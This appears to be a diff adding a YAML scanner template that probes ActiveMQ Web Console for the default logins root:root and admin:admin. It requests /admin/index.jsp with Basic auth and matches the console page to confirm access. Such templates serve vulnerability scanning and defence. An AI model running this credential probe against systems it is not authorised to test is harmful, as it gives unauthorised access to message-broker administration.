@@ -1,0 +1,22 @@
+id: poc-yaml-activemq-weak-pass
+info:
+  name: ActiveMQ Web Console 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: ActiveMQ
+  osprey-id: vb_2019_0079
+variables:
+  v_auth: 'base64("root:root")
+
+    base64("admin:admin")'
+requests:
+- method: GET
+  path: /admin/index.jsp
+  headers:
+    Authorization: Basic {{.v_auth}}
+  expression: 'contains(body, "ActiveMQ Console") && contains(body, "standardista-table-sorting.js")
+    && contains(body, "prettify.js")
+
+    '
+transport: http
